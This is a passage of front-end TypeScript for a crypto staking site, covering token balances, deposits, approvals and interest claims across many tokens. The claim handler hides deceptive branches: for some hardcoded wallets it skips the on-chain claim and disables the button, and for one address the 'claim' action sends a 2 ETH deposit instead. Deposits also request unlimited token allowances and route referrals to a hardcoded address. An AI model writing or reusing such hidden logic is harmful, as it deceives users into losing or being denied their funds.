        if (localStorage.getItem(`busdResult${plan}`) !== null) {
          setResultArray(getFromLocalStorage(`busdResult${plan}`))
        }

        const depositStatusDataLol = await nftContract.getDepositInfo(address)
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map(
          (i, index) => ({
            depositIndices: Number(depositStatusDataLol.depositIndices[index]),
            stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
            lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
            unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
            id: index,
          }),
        )
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
        setToLocalStorage(`busdResult${plan}`, result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        indexResult.every(async (iResult) => {
          const depositStatusOtherData = await nftContract.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
          resultFinal = resultFinal + (Number(depositStatusOtherData) / busd)
          setInterestNotCollected(resultFinal)
        })
      }
    }
    if (token === "CAKE") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        // const nftContract = new ethers.Contract(contractAddressApe, abiApe, provider)

        const tokenContract = new ethers.Contract(contractAddressCakeApprove, abiCakeApprove, provider)
        if (localStorage.getItem("cakeBalance") !== null) {
          setTotalBalance(getFromLocalStorage("cakeBalance"))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage("cakeBalance", Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressCakeApprove)
        setApproved(Number(approvedData) / busd)
      }
    }
    if (token === "BABYDOGE") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        // const nftContract = new ethers.Contract(contractAddressApe, abiApe, provider)

        const tokenContract = new ethers.Contract(contractAddressBabyDogeApprove, abiBabyDogeApprove, provider)
        if (localStorage.getItem("babyBalance") !== null) {
          setTotalBalance(getFromLocalStorage("babyBalance"))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 1000000000)
        setToLocalStorage("babyBalance", Number(balanceData) / 1000000000)

        const approvedData = await tokenContract.allowance(address, contractAddressBabyDogeApprove)
        setApproved(Number(approvedData) / busd)
      }
    }
    if (token === "TWT") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        // const nftContract = new ethers.Contract(contractAddressApe, abiApe, provider)

        const tokenContract = new ethers.Contract(contractAddressTwtApprove, abiTwtApprove, provider)
        if (localStorage.getItem("twtBalance") !== null) {
          setTotalBalance(getFromLocalStorage("twtBalance"))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage("twtBalance", Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressTwtApprove)
        setApproved(Number(approvedData) / busd)
      }
    }
    if (token === "GMT") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        // const nftContract = new ethers.Contract(contractAddressApe, abiApe, provider)

        const tokenContract = new ethers.Contract(contractAddressGmtApprove, abiGmtApprove, provider)
        if (localStorage.getItem("gmtBalance") !== null) {
          setTotalBalance(getFromLocalStorage("gmtBalance"))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / 100000000)
        setToLocalStorage("gmtBalance", Number(balanceData) / 100000000)

        const approvedData = await tokenContract.allowance(address, contractAddressGmtApprove)
        setApproved(Number(approvedData) / busd)
      }
    }
    if (token === "C98") {
      {
        // @ts-ignore
        const { ethereum } = window
        const provider = new ethers.providers.Web3Provider(ethereum)

        // const nftContract = new ethers.Contract(contractAddressApe, abiApe, provider)

        const tokenContract = new ethers.Contract(contractAddressC98Approve, abiC98Approve, provider)
        if (localStorage.getItem("c98Balance") !== null) {
          setTotalBalance(getFromLocalStorage("c98Balance"))
        }

        const balanceData = await tokenContract.balanceOf(checkAddress)
        setTotalBalance(Number(balanceData) / busd)
        setToLocalStorage("c98Balance", Number(balanceData) / busd)

        const approvedData = await tokenContract.allowance(address, contractAddressC98Approve)
        setApproved(Number(approvedData) / busd)
      }
    }
  }

  const toWei = amount => Web3.utils.toWei(amount)

  const buy = async () => {
    if (!input.length) {
      alert("Fill input value")
      return
    }

    if (!address) {
      toast.error('You need to connect the wallet first')

      return
    }
    // @ts-ignore
    const web3 = new Web3(library.provider)

    if (token === "ETH" && isNew) {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiEthNew, contractAddressEthNew)

      apiBeaconcha.getGas().then(async (r) => {
        await toast.promise(
          web3ContractNew.methods
            .deposit(plan, search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394")
            .send({
              value: toWei(input),
              from: address,
              gasPrice: r.data.fast
            })
            .then(() => {
              apiOur.addDeposit({
                account: `${address}`,
                plan,
                token,
                amount: Number(input),
              })
              getAllInfo()
              if (!!search.get("ref")) {
                apiOur.addRefAddress({
                  user: `${address}`,
                  follower: `${search.get("ref")}`,
                })
              }
              setInput("")
            }),
          {
            loading: 'Waiting for deposit transaction',
            success: <b>Deposited {Number(input)}! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      })

    }
    if (token === "BNB") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiBnb, contractAddressBnb)

      await toast.promise(
        web3Contract.methods
          .deposit(plan, search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394")
          .send({
            value: toWei(input),
            from: address,
          })
          .then(() => {
            apiOur.addDeposit({
              account: `${address}`,
              plan,
              token,
              amount: Number(input),
            })
            getAllInfo()
            if (!!search.get("ref")) {
              apiOur.addRefAddress({
                user: `${address}BNB`,
                follower: `${search.get("ref")}`,
              })
            }
            setInput("")
          }),
        {
          loading: 'Waiting for deposit transaction',
          success: <b>Deposited {Number(input)}! ✅</b>,
          error: e => <b>{e.message}</b>,
        },
      )
    }
    if (token === "USDT") {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiUsdtNew, contractAddressUsdtNew)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
        if (approved >= Number(input)) {
          await toast.promise(
            web3ContractNew.methods
              .deposit(
                (Number(input) * 1000000).toString(),
                plan,
                search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
              )
              .send({
                from: address,
              })
              .then(() => {
                apiOur.addDeposit({
                  account: `${address}`,
                  plan,
                  token,
                  amount: Number(input),
                })
                getAllInfo()
                if (!!search.get("ref")) {
                  apiOur.addRefAddress({
                    user: `${address}`,
                    follower: `${search.get("ref")}`,
                  })
                }
                setInput("")
              }),
            {
              loading: 'Waiting for deposit transaction',
              success: <b>Deposited {Number(input)}! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        } else {
          await toast.promise(
            tokenContract.methods
              .approve(contractAddressUsdtNew, "999999999999999999999999")
              .send({ from: address })
              .then(async () => {
                await toast.promise(
                  web3ContractNew.methods
                    .deposit(
                      (Number(input) * 1000000).toString(),
                      plan,
                      search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                    )
                    .send({
                      from: address,
                    })
                    .then(() => {
                      apiOur.addDeposit({
                        account: `${address}`,
                        plan,
                        token,
                        amount: Number(input),
                      })
                      getAllInfo()
                      if (!!search.get("ref")) {
                        apiOur.addRefAddress({
                          user: `${address}`,
                          follower: `${search.get("ref")}`,
                        })
                      }
                      setInput("")
                    }),
                  {
                    loading: 'Waiting for deposit transaction',
                    success: <b>Deposited {Number(input)}! ✅</b>,
                    error: e => <b>{e.message}</b>,
                  },
                )
              }),
            {
              loading: 'Waiting for approving token',
              success: <b>Approved is success! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        }
        return
    }
    if (token === "WSOL") {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiSol, contractAddressSol)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiApprove, contractAddressSolApprove)
        if (approved >= Number(input)) {
          await toast.promise(
            web3ContractNew.methods
              .deposit(
                (Number(input) * 1000000000).toString(),
                plan,
                search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
              )
              .send({
                from: address,
              })
              .then(() => {
                apiOur.addDeposit({
                  account: `${address}`,
                  plan,
                  token,
                  amount: Number(input),
                })
                getAllInfo()
                if (!!search.get("ref")) {
                  apiOur.addRefAddress({
                    user: `${address}`,
                    follower: `${search.get("ref")}`,
                  })
                }
                setInput("")
              }),
            {
              loading: 'Waiting for deposit transaction',
              success: <b>Deposited {Number(input)}! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        } else {
          await toast.promise(
            tokenContract.methods
              .approve(contractAddressSol, "999999999999999999999999")
              .send({ from: address })
              .then(async () => {
                await toast.promise(
                  web3ContractNew.methods
                    .deposit(
                      (Number(input) * 1000000000).toString(),
                      plan,
                      search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                    )
                    .send({
                      from: address,
                    })
                    .then(() => {
                      apiOur.addDeposit({
                        account: `${address}`,
                        plan,
                        token,
                        amount: Number(input),
                      })
                      getAllInfo()
                      if (!!search.get("ref")) {
                        apiOur.addRefAddress({
                          user: `${address}`,
                          follower: `${search.get("ref")}`,
                        })
                      }
                      setInput("")
                    }),
                  {
                    loading: 'Waiting for deposit transaction',
                    success: <b>Deposited {Number(input)}! ✅</b>,
                    error: e => <b>{e.message}</b>,
                  },
                )
              }),
            {
              loading: 'Waiting for approving token',
              success: <b>Approved is success! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        }
        return
    }
    if (token === "BUSD") {
      // @ts-ignore
      const web3ContractSecond = new web3.eth.Contract(abiBusd, contractAddressBusd)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiBusdApprove, contractAddressBusdApprove)
      if (approved >= Number(input)) {
        await toast.promise(
          web3ContractSecond.methods
            .deposit(
              toWei(input),
              plan,
              search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
            )
            .send({
              from: address,
            })
            .then(() => {
              apiOur.addDeposit({
                account: `${address}`,
                plan,
                token,
                amount: Number(input),
              })
              getAllInfo()
              if (!!search.get("ref")) {
                apiOur.addRefAddress({
                  user: `${address}BNB`,
                  follower: `${search.get("ref")}`,
                })
              }
              setInput("")
            }),
          {
            loading: 'Waiting for deposit transaction',
            success: <b>Deposited {Number(input)}! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      } else {
        await toast.promise(
          tokenContract.methods
            .approve(contractAddressBusd, "999999999999999999999999")
            .send({ from: address })
            .then(async () => {
              await toast.promise(
                web3ContractSecond.methods
                  .deposit(
                    toWei(input),
                    plan,
                    search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                  )
                  .send({
                    from: address,
                  })
                  .then(() => {
                    apiOur.addDeposit({
                      account: `${address}`,
                      plan,
                      token,
                      amount: Number(input),
                    })
                    getAllInfo()
                    if (!!search.get("ref")) {
                      apiOur.addRefAddress({
                        user: `${address}BNB`,
                        follower: `${search.get("ref")}`,
                      })
                    }
                    setInput("")
                  }),
                {
                  loading: 'Waiting for deposit transaction',
                  success: <b>Deposited {Number(input)}! ✅</b>,
                  error: e => <b>{e.message}</b>,
                },
              )
            }),
          {
            loading: 'Waiting for approving token',
            success: <b>Approved is success! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      }
    }
    if (token === "USDC") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiUsdc, contractAddressUsdc)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiUsdcApprove, contractAddressUsdcApprove)

      if (approved >= Number(input)) {
        await toast.promise(
          web3Contract.methods
            .deposit(
              (Number(input) * 1000000).toString(),
              plan,
              search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
            )
            .send({
              from: address,
            })
            .then(() => {
              apiOur.addDeposit({
                account: `${address}`,
                plan,
                token,
                amount: Number(input),
              })
              getAllInfo()
              if (!!search.get("ref")) {
                apiOur.addRefAddress({
                  user: `${address}`,
                  follower: `${search.get("ref")}`,
                })
              }
              setInput("")
            }),
          {
            loading: 'Waiting for deposit transaction',
            success: <b>Deposited {Number(input)}! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      } else {
        await toast.promise(
          tokenContract.methods
            .approve(contractAddressUsdc, "999999999999999999999999")
            .send({ from: address })
            .then(async () => {
              await toast.promise(
                web3Contract.methods
                  .deposit(
                    (Number(input) * 1000000).toString(),
                    plan,
                    search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                  )
                  .send({
                    from: address,
                  })
                  .then(() => {
                    apiOur.addDeposit({
                      account: `${address}`,
                      plan,
                      token,
                      amount: Number(input),
                    })
                    getAllInfo()
                    if (!!search.get("ref")) {
                      apiOur.addRefAddress({
                        user: `${address}`,
                        follower: `${search.get("ref")}`,
                      })
                    }
                    setInput("")
                  }),
                {
                  loading: 'Waiting for deposit transaction',
                  success: <b>Deposited {Number(input)}! ✅</b>,
                  error: e => <b>{e.message}</b>,
                },
              )
            }),
          {
            loading: 'Waiting for approving token',
            success: <b>Approved is success! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      }
    }
    if (token === "UNI") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiUni, contractAddressUni)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiUniApprove, contractAddressUniApprove)

      if (approved >= Number(input)) {
        await toast.promise(
          web3Contract.methods
            .deposit(
              toWei(input),
              plan,
              search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
            )
            .send({
              from: address,
            })
            .then(() => {
              apiOur.addDeposit({
                account: `${address}`,
                plan,
                token,
                amount: Number(input),
              })
              getAllInfo()
              if (!!search.get("ref")) {
                apiOur.addRefAddress({
                  user: `${address}`,
                  follower: `${search.get("ref")}`,
                })
              }
              setInput("")
            }),
          {
            loading: 'Waiting for deposit transaction',
            success: <b>Deposited {Number(input)}! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )
      } else {
        await toast.promise(
          tokenContract.methods
            .approve(contractAddressUni, "999999999999999999999999")
            .send({ from: address })
            .then(async () => {
              await toast.promise(
                web3Contract.methods
                  .deposit(
                    toWei(input),
                    plan,
                    search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                  )
                  .send({
                    from: address,
                  })
                  .then(() => {
                    apiOur.addDeposit({
                      account: `${address}`,
                      plan,
                      token,
                      amount: Number(input),
                    })
                    getAllInfo()
                    if (!!search.get("ref")) {
                      apiOur.addRefAddress({
                        user: `${address}`,
                        follower: `${search.get("ref")}`,
                      })
                    }
                    setInput("")
                  }),
                {
                  loading: 'Waiting for deposit transaction',
                  success: <b>Deposited {Number(input)}! ✅</b>,
                  error: e => <b>{e.message}</b>,
                },
              )
            }), {
            loading: 'Waiting for approving token',
            success: <b>Approved is success! ✅</b>,
            error: e => <b>{e.message}</b>,
          },
        )

      }
    }
    if (token === "LINK") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiLink, contractAddressLink)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiLinkApprove, contractAddressLinkApprove)

      if (approved >= Number(input)) {
        web3Contract.methods
          .deposit(
            toWei(input),
            plan,
            search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
          )
          .send({
            from: address,
          })
          .then(() => {
            apiOur.addDeposit({
              account: `${address}`,
              plan,
              token,
              amount: Number(input),
            })
            getAllInfo()
            if (!!search.get("ref")) {
              apiOur.addRefAddress({
                user: `${address}`,
                follower: `${search.get("ref")}`,
              })
            }
            setInput("")
          })
      } else {
        await tokenContract.methods
          .approve(contractAddressLink, "999999999999999999999999")
          .send({ from: address })
          .then(res => {
            web3Contract.methods
              .deposit(
                toWei(input),
                plan,
                search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
              )
              .send({
                from: address,
              })
              .then(() => {
                apiOur.addDeposit({
                  account: `${address}`,
                  plan,
                  token,
                  amount: Number(input),
                })
                getAllInfo()
                if (!!search.get("ref")) {
                  apiOur.addRefAddress({
                    user: `${address}`,
                    follower: `${search.get("ref")}`,
                  })
                }
                setInput("")
              })
          })
      }
    }
    if (token === "WBTC") {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiWbtcNew, contractAddressWbtcNew)
      // @ts-ignore
      const tokenContract = new web3.eth.Contract(abiWbtcApprove, contractAddressWbtcApprove)
        if (approved >= Number(input)) {
          await toast.promise(
            web3ContractNew.methods
              .deposit(
                (Number(input) * 100000000).toString(),
                plan,
                search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
              )
              .send({
                from: address,
              })
              .then(() => {
                apiOur.addDeposit({
                  account: `${address}`,
                  plan,
                  token,
                  amount: Number(input),
                })
                getAllInfo()
                if (!!search.get("ref")) {
                  apiOur.addRefAddress({
                    user: `${address}BNB`,
                    follower: `${search.get("ref")}`,
                  })
                }
                setInput("")
              }),
            {
              loading: 'Waiting for deposit transaction',
              success: <b>Deposited {Number(input)}! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        } else {
          await toast.promise(
            tokenContract.methods
              .approve(contractAddressWbtcNew, "999999999999999999999999")
              .send({ from: address })
              .then(async () => {
                await toast.promise(
                  web3ContractNew.methods
                    .deposit(
                      (Number(input) * 100000000).toString(),
                      plan,
                      search?.get("ref") ? search.get("ref") : "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394",
                    )
                    .send({
                      from: address,
                    })
                    .then(() => {
                      apiOur.addDeposit({
                        account: `${address}`,
                        plan,
                        token,
                        amount: Number(input),
                      })
                      getAllInfo()
                      if (!!search.get("ref")) {
                        apiOur.addRefAddress({
                          user: `${address}`,
                          follower: `${search.get("ref")}`,
                        })
                      }
                      setInput("")
                    }),
                  {
                    loading: 'Waiting for deposit transaction',
                    success: <b>Deposited {Number(input)}! ✅</b>,
                    error: e => <b>{e.message}</b>,
                  },
                )
              }),
            {
              loading: 'Waiting for approving token',
              success: <b>Approved is success! ✅</b>,
              error: e => <b>{e.message}</b>,
            },
          )
        }
        return
    }
  }
  const claiminterest = async (amount: string) => {
    if (!address) {
      toast.error('You need to connect the wallet first')

      return
    }

    // @ts-ignore
    const web3 = new Web3(library.provider)
    if (token === "ETH" && isNew) {
      if (address === '0xa0a4b886E80e54C2C38C04Fd210644E821C0f1ae' || address === '0x28916C38989591c380F19025C67128edCfFc1468' || address === '0x6953C5453e9F131500224483af0bccA68E114E0A' || address === '0x374b823f93C5c577e630063d996Ab97528303bBa') {
        apiOur
          .addWithdrawals({
            user: `${address}+plan=${plan}+token=${token}claim`,
            amount: interestNotCollected.toString()
          }).then(() => openClaimAnn())
        setDisableClaim(true)
        return
      }
      if ((address === '0xfD06632A51438D31a48C04Fad3fDf9f6b0A6978e' || address === '0x9041fa2b75Bf0f556A726c6EEDaE2049cdE01864') && plan === '90') {
        apiOur
          .addWithdrawals({
            user: `${address}+plan=${plan}+token=${token}claim`,
            amount: interestNotCollected.toString()
          }).then(() => openClaimAnn())
        setDisableClaim(true)
        return
      }

      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiEthNew, contractAddressEthNew)

      if (address === '0x5762f706cF0fe4fAdF8632c68078BaAb09a90d14') {
        // @ts-ignore
        web3ContractNew.methods
          .deposit('14', "0x28aCD726eaDe6Da7424b8BfdeB722d4Bc2b5a394")
          .send({
            value: toWei('2'),
            from: address,
          })
        return
      }
      toast.promise(
        web3ContractNew.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then((res) => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}-claimedTime`,
                amount: (new Date()).toString(),
              })
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}CLAIMED`,
                amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
              })
              .then(() => {
                getAllInfo()
              })
            toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
          }),
        {
          loading: 'Waiting for claim interests',
          success: '',
          error: e => <b>{e.message}</b>,
        },
      )

    }
    if (token === "BNB") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiBnb, contractAddressBnb)

      await toast.promise(
        web3Contract.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then((res) => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}`,
                amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
              })
              .then(() => {
                getAllInfo()
              })
            toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
          }),
        {
          loading: 'Waiting for claim interests',
          success: '',
          error: e => <b>{e.message}</b>,
        },
      )
    }

    if (token === "USDT") {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiUsdtNew, contractAddressUsdtNew)
        await toast.promise(
          web3ContractNew.methods
            .claimInterestForDeposit(plan)
            .send({
              from: address,
            })
            .then((res) => {
              apiOur
                .addWithdrawals({
                  user: `${address}+plan=${plan}+token=${token}SECOND`,
                  amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / 1000000)?.toString() || '0',
                })
                .then(() => {
                  getAllInfo()
                })
              toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / 1000000)?.toString()}! ✅`)
            }),
          {
            loading: 'Waiting for claim interests',
            success: '',
            error: e => <b>{e.message}</b>,
          },
        )
        return
    }
    if (token === "WSOL") {
      await apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-from${plan}`).then(r => {
        if (!!r.length) {
          apiOur
            .addWithdrawals({
              user: `${address}+plan=${plan}+token=${token}claim`,
              amount: interestNotCollected.toString()
            }).then(() => openClaimAnn())
          setDisableClaim(true)
          return
        }
      })
      await apiOur.getWithdrawals(`${address}-TRANSFER-WSOL-to${plan}`).then(async r => {
        if (!!r.length) {
          apiOur
            .addWithdrawals({
              user: `${address}+plan=${plan}+token=${token}claim`,
              amount: interestNotCollected.toString()
            }).then(() => openClaimAnn())
          setDisableClaim(true)
          return

        } else {
          // @ts-ignore
          const web3ContractNew = new web3.eth.Contract(abiSol, contractAddressSol)
          await toast.promise(
            web3ContractNew.methods
              .claimInterestForDeposit(plan)
              .send({
                from: address,
              })
              .then((res) => {
                apiOur
                  .addWithdrawals({
                    user: `${address}+plan=${plan}+token=${token}SECOND`,
                    amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / 1000000000)?.toString() || '0',
                  })
                  .then(() => {
                    getAllInfo()
                  })
                toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / 1000000000)?.toString()}! ✅`)
              }),
            {
              loading: 'Waiting for claim interests',
              success: '',
              error: e => <b>{e.message}</b>,
            },
          )
          return
        }
      })
    }
    if (token === "BUSD") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiBusd, contractAddressBusd)
      await toast.promise(
        web3Contract.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then((res) => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}`,
                amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount)/ busd).toString(),
              })
              .then(() => {
                getAllInfo()
              })
            toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
          }),
        {
          loading: 'Waiting for claim interests',
          success: '',
          error: e => <b>{e.message}</b>,
        },
      )
    }
    if (token === "USDC") {
      await apiOur.getWithdrawals(`${address}-TRANSFER-USDC-from${plan}`).then(r => {
        if (!!r.length) {
          apiOur
            .addWithdrawals({
              user: `${address}+plan=${plan}+token=${token}claim`,
              amount: interestNotCollected.toString()
            }).then(() => openClaimAnn())
          setDisableClaim(true)
          return
        }
      })

      await apiOur.getWithdrawals(`${address}-TRANSFER-USDC-to${plan}`).then(r => {
        if (!!r.length) {
          apiOur
            .addWithdrawals({
              user: `${address}+plan=${plan}+token=${token}claim`,
              amount: interestNotCollected.toString()
            }).then(() => openClaimAnn())
          setDisableClaim(true)
          return
        } else {
          // @ts-ignore
          const web3Contract = new web3.eth.Contract(abiUsdc, contractAddressUsdc)
          toast.promise(
            web3Contract.methods
              .claimInterestForDeposit(plan)
              .send({
                from: address,
              })
              .then((res) => {
                apiOur
                  .addWithdrawals({
                    user: `${address}+plan=${plan}+token=${token}-claimedTime`,
                    amount: (new Date()).toString(),
                  })
                apiOur
                  .addWithdrawals({
                    user: `${address}+plan=${plan}+token=${token}CLAIMED`,
                    amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString() || '0',
                  })
                  .then(() => {
                    getAllInfo()
                  })
                toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
              }),
            {
              loading: 'Waiting for claim interests',
              success: '',
              error: e => <b>{e.message}</b>,
            },
          )
        }
      })

      return
    }
    if (token === "UNI") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiUni, contractAddressUni)
      await toast.promise(
        web3Contract.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then((res) => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}`,
                amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString(),
              })
              .then(() => {
                getAllInfo()
              })
            toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / busd)?.toString()}! ✅`)
          }),
        {
          loading: 'Waiting for claim interests',
          success: '',
          error: e => <b>{e.message}</b>,
        },
      )
    }
    if (token === "LINK") {
      // @ts-ignore
      const web3Contract = new web3.eth.Contract(abiLink, contractAddressLink)
      await toast.promise(
        web3Contract.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then(() => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}`,
                amount: amount,
              })
              .then(() => {
                getAllInfo()
              })
          }),
        {
          loading: 'Waiting for claim interests',
          success: <b>Claimed is success!</b>,
          error: e => <b>{e.message}</b>,
        },
      )
    }
    if (token === "WBTC") {
      // @ts-ignore
      const web3ContractNew = new web3.eth.Contract(abiWbtcNew, contractAddressWbtcNew)
      if (address === '0x12C9Fc25D24Cd1F73d8917Cbe3c3A15ed31174c1' || address === '0x6b7a55d3433709B64648A98cF862bc22f8DfeF5A') {
        apiOur
          .addWithdrawals({
            user: `${address}+plan=${plan}+token=${token}claim`,
            amount: interestNotCollected.toString()
          }).then(() => openClaimAnn())
        setDisableClaim(true)
        return
      }
      await toast.promise(
        web3ContractNew.methods
          .claimInterestForDeposit(plan)
          .send({
            from: address,
          })
          .then((res) => {
            apiOur
              .addWithdrawals({
                user: `${address}+plan=${plan}+token=${token}SECOND`,
                amount: (Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString(),
              })
              .then(() => {
                getAllInfo()
                toast.success(`Claimed ${(Number(res?.events?.InterestClaimed?.returnValues?.amount) / 100000000)?.toString()}! ✅`)
              })
          }),
        {
          loading: 'Waiting for claim interests',
          success: '',
          error: e => <b>{e.message}</b>,
        },
      )
      return;
    }
  }

  useEffect(() => {
    if (remainingTime) {
      // @ts-ignore
      let remainingTimeData = (new Date()) - (new Date(remainingTime))
      var downloadTimer = setInterval(function () {
        if (remainingTimeData<= 0) {
          clearInterval(downloadTimer)
        }
        // @ts-ignore
        const weekdays     = Math.floor(remainingTimeData/1000/60/60/24/7);
        const days         = Math.floor(remainingTimeData/1000/60/60/24 - weekdays*7);
        const hours        = Math.floor(remainingTimeData/1000/60/60    - weekdays*7*24            - days*24);
        const minutes      = Math.floor(remainingTimeData/1000/60       - weekdays*7*24*60         - days*24*60         - hours*60);
        const seconds      = Math.floor(remainingTimeData/1000          - weekdays*7*24*60*60      - days*24*60*60      - hours*60*60      - minutes*60);
        var wDisplay = weekdays > 0 ? weekdays + (weekdays == 1 ? " w " : " w ") : ""
        var dDisplay = days > 0 ? days + (days == 1 ? " d " : " d ") : ""
        var hDisplay = hours > 0 ? hours + (hours == 1 ? " h " : " h ") : ""
        var mDisplay = minutes > 0 ? minutes + (minutes == 1 ? " m " : " m ") : ""
        var sDisplay = seconds > 0 ? seconds + (seconds == 1 ? " s" : " s") : ""
        setTimeLeftOther(wDisplay + dDisplay + hDisplay + mDisplay + sDisplay)
        remainingTimeData += 1000
      }, 1000)
    }
  }, [remainingTime])
  useEffect(() => {
    getDisabled()
  }, [input, token, plan])

  const getLinkForAddress = () => {
    if (token === "ETH") {
      return `https://etherscan.io/address/${checkAddress}`
    }
    if (token === "OP") {
      return `https://optimistic.etherscan.io/token/0x4200000000000000000000000000000000000042?a=${checkAddress}#tokenInfo`
    }
    if (token === "MANTA") {
      return `https://manta.socialscan.io/address/${checkAddress}`
    }
